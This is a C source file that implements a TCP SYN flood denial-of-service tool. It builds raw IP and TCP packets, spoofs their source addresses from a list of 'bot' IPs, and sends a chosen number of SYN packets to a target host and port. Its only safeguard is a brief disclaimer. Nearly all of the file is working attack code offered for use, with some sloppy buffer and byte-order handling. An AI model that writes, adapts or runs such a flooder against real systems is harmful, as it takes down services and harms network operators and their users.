/**
**** author: 4anonz(Anonymous Hacks)
**** description: This is a C program that implements the theory of the DDoS TCP SYN flood attack
**** discplaimer: Do not use this tool on any network you don't have permission to.
**** By using this tool you agree that you'll be helt responsible for any damage caused
**/

#include "util.h"
#include <pthread.h>
#include <netinet/tcp.h>
#include <stdio.h>

#define PACKT_SIZE 6551

char bots[5049][100] = {};
int lines = 0, counter = 0, packet_num = 0, ec = 0;
void *syn_flood_thread(void *);

struct tcp_syn {
    struct sockaddr_in addr;
    int port;
    char *ip_addr;
};
/**
 * This function is use for performing the TCP SYN
 *  DDoS attack..
*/
void tcp_syn_flood(char *dest_ip, int dest_port, char *spoof_ip, struct sockaddr_in *d_addr) {

    
    char packet[4097], data[PACKT_SIZE];
    memset(packet, 0, sizeof(packet));
    struct iphdr *ip_header = (struct iphdr*)packet;
    struct tcphdr *tcp_header = (struct tcphdr*)(packet + sizeof(struct ip));

    //Generate a random id for this packet
    int id = random_range(213, 95843);
    struct in_addr daddr;
    daddr.s_addr = inet_addr(dest_ip);
    
    int i = 0;
    for(; i < PACKT_SIZE-1; i++)
        data[i] = i + '0';
    
    data[i] = 0;
    int tot_len = sizeof(struct ip) + sizeof(struct tcphdr) + strlen(data);
    //IP HEADER
    ip_header->ihl = 5;                         //The ip header length
    ip_header->version = 4;                     //The ip version(IPv4)
    ip_header->tos = 0;                         //Type of service
    ip_header->tot_len = tot_len;               //Total length
    ip_header->id = htons(id);                  //Packet id
    ip_header->frag_off = 0;                    //Fragment off
    ip_header->ttl = 255;                       //Time to leave
    ip_header->protocol = IPPROTO_TCP;          //Protocol
    ip_header->check = 0;                       //Checksum
    ip_header->saddr = inet_addr(spoof_ip);     //Source ip address
    ip_header->daddr = daddr.s_addr;            //Destination ip address

    ip_header->check = checksum(&packet, tot_len);  //Checksum
    //Generate a random source port number
    int source_port = random_range(1029, 65535);
    int seq = random_range(100001, 1105024978);


    //TCP HEADER
    tcp_header->source = htons(source_port);       // source port
    tcp_header->dest = htons(dest_port);           // destination port
    tcp_header->seq = htonl(seq);                  // seqence number
    tcp_header->ack_seq = 0;                       // acknowlegement number
    tcp_header->doff = 5;                          // TCP header length
    tcp_header->fin = 0;                           // finish flag
    tcp_header->syn = 1;                           // synchronization flag
    tcp_header->rst = 0;                           // reset flag
    tcp_header->psh = 0;                           // push flag
    tcp_header->ack = 0;                           // acknowlegment flag
    tcp_header->urg = 0;                           // urgent flag
    tcp_header->window = htons(6460);              // window size
    tcp_header->check = 0;                         // Checksum
    tcp_header->urg_ptr = 0;                       // urgent pointer
    //tcp_header->res1 = 0;
    //tcp_header->res2 = 0;

    struct pseudo_header psh;
    char *temp;
    int psize = sizeof(struct tcphdr) + sizeof(struct pseudo_header) + strlen(data);

    psh.source_address = inet_addr(spoof_ip);
    psh.destination_address = daddr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr) + strlen(data));


    temp = malloc(psize);
    memcpy(temp, (char*)&psh, sizeof(struct pseudo_header));
    memcpy(temp + sizeof(struct pseudo_header), tcp_header ,
                                sizeof(struct tcphdr)+strlen(data));
    tcp_header->check = checksum(temp, psize);

    // Create a raw socket
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if(sock < 0) {
        fprintf(stderr, "%s[%sERROR%s]:%s Error creating socket %s%s%s\n",
        whi, red, whi, res, pur, strerror(errno), res);
        exit(1);
    }

    //We tell the kernel that headers are included in the packet
    int val = 1;
    if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &val, sizeof(val)) < 0) {
        fprintf(stderr, "%s[%sERROR%s]:%s Failed to set socket option %s%s%s\n",
        whi, red, whi, res, pur, strerror(errno), res);
        exit(1);
    }
    d_addr->sin_port = htons(dest_port);

    if(sendto(sock, packet, tot_len, 0, 
                        (struct sockaddr*)d_addr, sizeof(*d_addr)) < 0) {
        ec++;
        fprintf(stderr, "%s[%sERROR%s]:%s Failed to send packet %s%s%s\n",
        whi, red, whi, res, pur, strerror(errno), res);
        if(ec == 5)
            exit(1);
    }
    counter++;
    close(sock);
}
void print_status(char *ip) {
    printf("%s[%sINFO%s]:%s Sending TCP SYN packet..Using spoofed source ip %s[%s%s%s]%s (%d/%d)\n", 
    whi, gre, whi, res, whi, pur, ip, whi, res, counter, packet_num);
}

void *syn_flood_thread(void *vargb) {
    struct tcp_syn *res = (struct tcp_syn*)vargb;
    struct sockaddr_in d_addr;
    d_addr = res->addr;
    int port = res->port;
    char *ip = res->ip_addr;
    
    static int counter = 0;
    int index = random_range(0, lines);
    if(strlen(bots[index]) < 1)
        index -= 1;
    char *source_ip = bots[index];
    tcp_syn_flood(ip, port, source_ip, &d_addr);
    print_status(source_ip);
    return NULL;
}

int main(int argc, char *argv[]) {

    srand(time(0));
    if(argc < 5) {
        printf("%s[%sCRITICAL%s]:%s Missing argument(s)...\n", whi, yel, whi, res);
        fprintf(stderr, "%sUsage:%s tcp_syn_flood [target ip/hostname] [bots file] [port] [number of packets]\n", whi, res);
        exit(1);
    }
    char *host = argv[1];
    char *bots_file = argv[2];
    int port = atoi(argv[3]);
    packet_num = atoi(argv[4]);

        
    FILE *fp;
    char *tmp;
    int i = 0;

    //Open the file containing the botnets ip address and store them
    fp = fopen(bots_file, "r");
    if(fp == NULL) {
        fprintf(stderr, "%s[%sERROR%s]:%s Failed to open file %s%s%s\n",
        whi, red, whi, res, pur, bots_file, res);
        exit(1);
    }
    while(fgets(bots[i], sizeof(bots[i]), fp)) {
        if((tmp = strchr(bots[i], '\n')) != NULL)
            *tmp = '\0';
        i++;
        lines++;
    }
    fclose(fp);

    struct sockaddr_in addr_conn;
    //Resolve hostname to ip
    char *ip = dns_lookup(host, &addr_conn);
    if(ip == NULL) {
        fprintf(stderr, "%s[%sERROR%s]:%s Failed to resolve hostname/ip '%s'\n",
        whi, red, whi, res, host);
        exit(1);
    }
    struct tcp_syn *fld = (struct tcp_syn*) calloc(1, sizeof(struct tcp_syn));
    if(!fld) {
        fprintf(stderr, "%s[%sERROR%s]:%s Out of memory space!\n",
        whi, red, whi, res);
        exit(1);
    }

    fld->addr = addr_conn;
    fld->port = port;
    fld->ip_addr = ip;
    pthread_t thread_id;
    int k = 0;
    //Create threads for this attack.
    
    while(k < packet_num) {
        pthread_create(&thread_id, NULL, syn_flood_thread, (void*)fld);
        pthread_join(thread_id, NULL);
        k++;
    }
    free(fld);
    return 0;
}
